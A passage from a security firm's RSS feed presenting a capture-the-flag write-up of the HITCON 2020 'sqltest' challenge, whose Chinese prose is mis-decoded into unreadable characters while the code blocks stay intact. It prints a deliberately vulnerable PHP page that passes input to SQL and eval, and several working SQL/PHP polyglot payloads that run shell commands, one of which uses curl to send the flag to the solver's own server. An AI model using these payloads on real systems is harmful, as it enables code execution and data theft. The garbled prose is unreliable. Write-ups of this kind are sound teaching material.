<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
        <title>DEVCORE æˆ´å¤«å¯‡çˆ¾</title>
        <description>DEVCORE æˆ´å¤«å¯‡çˆ¾ - æ»²é€æ¸¬è©¦æœå‹™ã€è³‡å®‰æ•™è‚²è¨“ç·´ã€è³‡å®‰é¡§å•æœå‹™</description>
        <link>https://devco.re</link>
        <lastBuildDate>Thu, 28 Jan 2021 19:14:08 +0800</lastBuildDate>
        <pubDate>Thu, 28 Jan 2021 19:14:08 +0800</pubDate>
        <ttl>1800</ttl>
        <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />


        <item>
                <title>DEVCORE Wargame at HITCON 2020</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;æ­æ™šå®‰ï½ä¸€å¹´ä¸€åº¦çš„è³‡å®‰åœˆå¤§æ‹œæ‹œæ´»å‹•ä¹‹ä¸€ HITCON 2020 åœ¨ç´„ä¸€å€‹æœˆå‰é †åˆ©è½å¹•å•¦ï¼Œä»Šå¹´æˆ‘å€‘ç…§èˆŠåœ¨æ”¤ä½æº–å‚™äº†å¹¾é“å°å°çš„ Wargame çµ¦æœƒçœ¾æœ‹å‹å€‘æŒ‘æˆ°è‡ªèº«æŠ€è¡“ï¼Œä¸¦åŒæ¨£æº–å‚™äº†å¹¾ä»½ç²¾ç¾å°ç¦®ç‰©é€çµ¦æŒ‘æˆ°æˆåŠŸçš„æœ‹å‹å€‘ã€‚&lt;/p&gt;

&lt;p&gt;ç¸½è¨ˆæ´»å‹•å…©å¤©é–“æœ‰ç™»å…¥ä¸¦æäº¤è‡³å°‘ä¸€æŠŠ flag çš„äººæ•¸ç‚º 92 äººï¼Œéå¸¸æ„Ÿè¬å¤§å®¶è¸´èºåœ°åƒèˆ‡ï¼Œé€™æ¬¡æœªèƒ½æˆåŠŸåœ¨æ™‚é–“å…§å®ŒæˆæŒ‘æˆ°è€Œæœªé ˜åˆ°å°ç¦®ç‰©çš„æœ‹å‹å€‘ä¹Ÿåˆ¥å¤ªç°å¿ƒï¼Œç‚ºäº†èƒ½æ›´å¤šçš„å›é¥‹ç¤¾ç¾¤ï¼Œæ‰€ä»¥æˆ‘å€‘æ±ºå®šå¯«ä¸€ç¯‡æŠ€è¡“æ–‡ç« ä»‹ç´¹æœ¬æ¬¡ Wargame çš„å…¶ä¸­ä¸€é“é–‹æ”¾å¼é¡Œç›®&lt;code class=&quot;highlighter-rouge&quot;&gt;sqltest&lt;/code&gt;ï¼Œç‚ºæ­¤æˆ‘å€‘åœ¨æ´»å‹•å¾Œè©¢å•äº†æ‰€æœ‰è§£é¡Œçš„äººï¼Œæ”¶é›†äº†å¤§å®¶çš„è§£æ³•èˆ‡æ€è·¯ï¼Œä¸¦å°‡åœ¨æ–‡ç« çš„æ¥ä¸‹ä¾†ä¸€ä¸€ç‚ºå¤§å®¶ä»‹ç´¹ï¼&lt;/p&gt;

&lt;h2 id=&quot;sqltest-é¡Œç›®èªªæ˜&quot;&gt;sqltest é¡Œç›®èªªæ˜&lt;/h2&gt;

&lt;p&gt;é€™é“é¡Œç›®ä¸»è¦æ ¸å¿ƒçš„éƒ¨åˆ†å°±é€™ 3 å€‹æª”æ¡ˆï¼šDockerfileã€readflag.c å’Œ index.phpã€‚è®“æˆ‘å€‘å…ˆçœ‹çœ‹å‰å…©å€‹æª”æ¡ˆï¼Œå¯ä»¥å¾ä¸‹æ–¹çš„ Dockerfile ä¸­å…ˆè§€å¯Ÿåˆ° flag è¢«æ”¾ç½®åœ¨æª”æ¡ˆ /flag ä¹‹ä¸­ï¼Œä½†æ¬Šé™è¢«è¨­å®šç‚ºåƒ…æœ‰ root å¯ä»¥è®€å–ï¼Œå¦å¤–æº–å‚™äº†å…·æœ‰ setuid æ¬Šé™çš„åŸ·è¡Œæª” /readflagï¼Œè®“ä»»ä½•äººå‡å¯åœ¨åŸ·è¡Œæ­¤æª”æ¡ˆæ™‚å½è£æˆ root èº«åˆ†ï¼Œè€Œ /readflag çš„åŸå§‹ç¢¼å°±å¦‚ä¸‹æ–¹ readflag.c æ‰€ç¤ºï¼Œå¾ˆå–®ç´”çš„è®€å–ä¸¦è¼¸å‡º /flag æª”æ¡ˆå…§å®¹ï¼Œé€™å€‹é…ç½®å°±æ˜¯ä¸€å€‹å¾ˆæ¨™æº–ä»¥ getshell ç‚ºç›®æ¨™çš„ Wargame é¡Œç›®ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; php:7.4.10-apache&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setup OS env&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt update &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-install mysqli
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-enable mysqli

&lt;span class=&quot;c&quot;&gt;# setup web application&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./src/ /var/www/html/&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setup flag&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DEVCORE{flag}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /flag
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0400 /flag
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root /flag
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; readflag.c /readflag.c&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /readflag /readflag.c
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4555 /readflag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;readflag.c&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat /flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸Šè¿°å‰åŠéƒ¨ç‚ºç’°å¢ƒçš„ä½ˆç½®ï¼ŒçœŸæ­£é¡Œç›®çš„é–‹å§‹å‰‡è¦è¦‹ä¸‹æ–¹ index.phpï¼Œå…¶ä¸­ &lt;code class=&quot;highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; æ˜¯æˆ‘å€‘å¯ä»¥ä»»æ„æ§åˆ¶çš„åƒæ•¸ï¼Œé¡Œç›®é™¤äº† isset å¤–ä¸¦ç„¡å…¶ä»–ä»»ä½•æª¢æŸ¥ï¼Œéš¨å¾Œç¬¬ 8 è¡Œä¸­åƒæ•¸è¢«å¸¶å…¥ SQL èªå¥ä½œåŸ·è¡Œï¼Œå¦‚æœ SQL åŸ·è¡ŒæˆåŠŸä¸¦ä¸”æœ‰æŸ¥è©¢åˆ°è³‡æ–™ï¼Œå°±æœƒé€²å…¥ 15 è¡Œé–‹å§‹çš„è™•ç†ï¼Œä¾†è‡ª &lt;code class=&quot;highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;$column&lt;/code&gt; è®Šæ•¸å†æ¬¡è¢«ä½¿ç”¨ä¸¦å‚³å…¥ eval ä½œåŸ·è¡Œï¼Œé€™æ¨£çœ‹ä¸‹ä¾†é¡Œç›®çš„è§£é¡Œæ€è·¯å°±å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘å€‘éœ€è¦æ§‹é€ ä¸€å€‹å­—ä¸²ï¼ŒåŒæ™‚ç‚ºåˆæ³•çš„ SQL èªå¥èˆ‡ PHP èªå¥ï¼Œè®“ SQL åŸ·è¡Œæ™‚æœ‰å›å‚³å€¼ä¸” PHP åŸ·è¡Œæ™‚èƒ½å¤ åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ï¼Œå°±èƒ½ getshell ä¸¦å‘¼å« /readflag å–å¾— flagï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;index.php&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;No input&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; from mytable where id =&#39;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&#39;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;mysql&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;user&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;youtu.be/l11uaEjA-iI&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;sqltest&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_num_rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_fetch_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;output = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;row-&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;Database error&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;å‡ºé¡Œè€…è§£æ³•&quot;&gt;å‡ºé¡Œè€…è§£æ³•&lt;/h2&gt;

&lt;p&gt;èº«ç‚ºå‡ºé¡Œè€…ï¼Œç•¶ç„¶å¿…é ˆå…ˆæ‹‹ç£šä¸€ä¸‹æ‰èƒ½å¤ å¼•ç‰ï½&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;exploit:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={passthru(&#39;/readflag&#39;)}&amp;amp;id=1

SQL: SELECT {passthru(&#39;/readflag&#39;)} FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;{passthru(&#39;/readflag&#39;)};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•åˆ©ç”¨äº† MySQL ä¸€å€‹ç›¸å®¹æ€§çš„ç‰¹æ€§ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;{identifier expr}&lt;/code&gt; æ˜¯ ODBC Escape èªæ³•ï¼ŒMySQL ç›¸å®¹äº†é€™å€‹èªæ³•ï¼Œä½¿å¾—åœ¨èªå¥ä¸­å‡ºç¾æ™‚ä¸æœƒå°è‡´èªæ³•éŒ¯èª¤ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥æ§‹é€ å‡º &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT {passthru &#39;/readflag&#39;} FROM mytable WHERE id = &#39;1&#39;&lt;/code&gt; å­—ä¸²ä»ç„¶æœƒæ˜¯åˆæ³•çš„ SQL èªå¥ï¼Œæ›´é€²ä¸€æ­¥åœ°å˜—è©¦å°‡ ODBC Escape ä¸­çš„ç©ºç™½ç§»é™¤æ”¹ä»¥æ‹¬è™ŸåŒ…å¤¾å­—ä¸²çš„è©±ï¼Œæœƒè®Šæˆ &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT {passthru(&#39;/readflag&#39;)} FROM mytable WHERE id = &#39;1&#39;&lt;/code&gt;ï¼Œç”±æ–¼ MySQL æä¾›çš„èªæ³•å½ˆæ€§ï¼Œæ­¤æ®µèªå¥ä»ç„¶æœƒè¢«è¦–ç‚ºåˆæ³•ä¸¦ä¸”å¯æ­£å¸¸åŸ·è¡Œå¾—åˆ°ç›¸åŒçµæœã€‚&lt;/p&gt;

&lt;p&gt;æ¥è‘—å†çœ‹é€²åˆ° eval å‰æœƒæ§‹é€ å‡ºé€™æ¨£çš„ PHP èªå¥ï¼š&lt;code class=&quot;highlighter-rouge&quot;&gt;$output = $row-&amp;gt;{passthru(&#39;/readflag&#39;)}&lt;/code&gt;ï¼Œç”±æ–¼ PHP åœ¨èªæ³•ä¸Šä¹Ÿæä¾›äº†æ¥µå¤§çš„å½ˆæ€§ï¼Œä½¿å¾—æˆ‘å€‘å¯ä»¥åˆ©ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;$object-&amp;gt;{ expr }&lt;/code&gt; é€™æ¨£çš„èªæ³•å°‡ expr æ•˜è¿°å¥å‹•æ…‹åŸ·è¡Œå®Œçš„çµæœä½œç‚ºç‰©ä»¶å±¬æ€§åç¨±å»å­˜å–ç‰©ä»¶çš„å±¬æ€§ï¼Œå› æ­¤çµæœå°±æœƒå‘¼å« passthru å‡½å¼åŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;é€™é‚Šè£œå……ä¸€å€‹å†·çŸ¥è­˜ï¼Œç•¶æƒ³åˆ°ç³»çµ±æŒ‡ä»¤æ™‚ï¼Œå¤§å®¶ç›´è¦ºå¯èƒ½æœƒæƒ³åˆ°ä½¿ç”¨ system å‡½å¼ï¼Œä½†æ˜¯ MySQL åœ¨ 8.0.3 ä¸­å°‡ system åŠ å…¥é—œéµå­—ä¿ç•™å­—ä¹‹ä¸­ï¼Œè€Œé€™é¡Œç›®ç’°å¢ƒæ˜¯ä½¿ç”¨ MySQL 8.0 æ¶è¨­çš„ï¼Œæ‰€ä»¥å¦‚æœä½¿ç”¨ system çš„è©±åè€Œæœƒå¤±æ•—å”·ï¼&lt;/p&gt;

&lt;h2 id=&quot;ä¾†è‡ªæœƒçœ¾æœ‹å‹å€‘çš„è§£æ³•&quot;&gt;ä¾†è‡ªæœƒçœ¾æœ‹å‹å€‘çš„è§£æ³•&lt;/h2&gt;

&lt;p&gt;ç”±æ–¼æœ‹å‹å€‘è¸´èºæäº¤çš„è§£æ³•çœ¾å¤šï¼Œæ‰€ä»¥æˆ‘å€‘å°‡å„è§£æ³•ç°¡å–®åšäº†åˆ†çµ„ï¼Œå¦å¤–æé†’ä¸€ä¸‹ï¼Œä»¥ä¸‹é †åºåªæ˜¯æäº¤çš„å…ˆå¾Œæ™‚é–“å·®ï¼Œä¸¦ç„¡ä»»ä½•å„ªåŠ£ï¼Œèƒ½å–å¾— flag çš„è§£æ³•éƒ½æ˜¯å¥½è§£æ³•ï¼æ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘é€²è¡Œä»‹ç´¹å§ã€‚&lt;/p&gt;

&lt;h3 id=&quot;odbc-escape&quot;&gt;ODBC Escape&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;by Mico (https://www.facebook.com/MicoDer/):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;amp;id=1

SQL: SELECT {exec(&#39;curl http://Mico_SRV/?`/readflag`&#39;)};# FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;{exec(&#39;curl http://Mico_SRV/?`/readflag`&#39;)};#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•èˆ‡å‡ºé¡Œè€…çš„ååˆ†é¡ä¼¼ï¼Œä½†æ²’æœ‰ä½¿ç”¨å¯ä»¥ç›´æ¥è¼¸å‡ºçµæœçš„ passthru è€Œæ˜¯æ”¹ç”¨ execï¼Œæ¥è‘—é€é curl æŠŠçµæœå›å‚³è‡³è‡ªå·±çš„ä¼ºæœå™¨ï¼Œæ“šæœ¬äººèªªæ³•æ˜¯å› ç‚ºã€Œè¦ºå¾—é§­å®¢å°±è©²å‚³äº›ä»€éº¼å›ä¾†è‡ªå·±Server XD ã€XDã€‚&lt;/p&gt;

&lt;h3 id=&quot;comment-everywhere&quot;&gt;Comment Everywhere&lt;/h3&gt;

&lt;p&gt;å¹¾ä¹æ‰€æœ‰ç¨‹å¼èªè¨€éƒ½æœ‰è¨»è§£ç¬¦è™Ÿå¯ä»¥è®“é–‹ç™¼äººå“¡åœ¨ç¨‹å¼ç¢¼ä¸­é–“åŠ ä¸Šæ–‡å­—èªªæ˜ï¼Œä»¥ä¾¿ä¸‹ä¸€å€‹é–‹ç™¼äººå“¡æ¥æ‰‹æ™‚å¯ä»¥å¿«é€Ÿç†è§£é€™æ®µç¨‹å¼ç¢¼çš„æ„ç¾©ã€‚ç•¶ç„¶ SQL èˆ‡ PHP ä¹Ÿæœ‰å„è‡ªçš„è¨»è§£ç¬¦è™Ÿï¼Œä½†å®ƒå€‘æ‰€æ”¯æ´çš„ç¬¦è™Ÿè¡¨ç¤ºç¨å¾®æœ‰äº›å·®ç•°ï¼Œè€Œé€™å°å·®ç•°å°±å¯ä»¥å¹«åŠ©æˆ‘å€‘é”æˆç›®çš„ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by LJP (https://ljp-tw.github.io/blog/)&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%0a-- /*%0a-- */ ; system(&#39;/readflag&#39;);%0a&amp;amp;id=1

SQL: SELECT id
     -- /*
     -- */ ; system(&#39;/readflag&#39;);
     FROM mytable WHERE id = &#39;1&#39;
PHP: $output = id
     -- /*
     -- */ ; system(&#39;/readflag&#39;);
     ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•çœ‹ä¼¼è¤‡é›œï¼Œæœ¬è³ªä¸Šå…¶å¯¦å¾ˆå–®ç´”ï¼Œå°±æ˜¯åˆ©ç”¨å…©å€‹èªè¨€æ”¯æ´ä¸åŒè¨»è§£ç¬¦è™Ÿçš„ç‰¹æ€§ã€‚å°æ–¼ SQL è€Œè¨€ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; æ˜¯è¨»è§£ç¬¦è™Ÿï¼Œæœƒç„¡è¦–å¾Œæ–¹æ‰€æœ‰åˆ°æ›è¡Œç‚ºæ­¢çš„æ–‡å­—ï¼Œæ‰€ä»¥æ¯ä¸€è¡Œä»¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; é–‹é ­çš„å­—ä¸²ï¼ŒSQL æ˜¯çœ‹ä¸è¦‹çš„ã€‚æ¥è‘—ä¾†çœ‹ PHPï¼Œå°æ–¼ PHP è€Œè¨€ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;/* ä»»ä½•å­—ä¸² */&lt;/code&gt; é€™æ˜¯è¨»è§£çš„è¡¨ç¤ºæ–¹å¼ï¼Œé–‹é ­çµå°¾ç”± / èˆ‡ * 